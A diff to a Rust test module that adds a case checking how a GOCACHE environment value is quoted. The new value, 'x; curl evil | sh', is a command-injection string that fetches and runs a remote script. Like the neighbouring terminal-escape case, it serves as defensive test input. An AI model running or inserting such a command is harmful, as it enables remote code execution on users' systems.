@@ -1057,6 +1057,7 @@ mod tests {
             ("GOCACHE", "..", "\"..\""),
             ("GOCACHE", "cache/artifacts", "\"cache/artifacts\""),
             ("GOCACHE", "cache:artifacts", "\"cache:artifacts\""),
+            ("GOCACHE", "x; curl evil | sh", "\"x; curl evil | sh\""),
             ("GOCACHE", "a\u{1b}[2Jb", "\"a\\u{1b}[2Jb\""),
         ] {
             let b = spec(env_var, prefix);
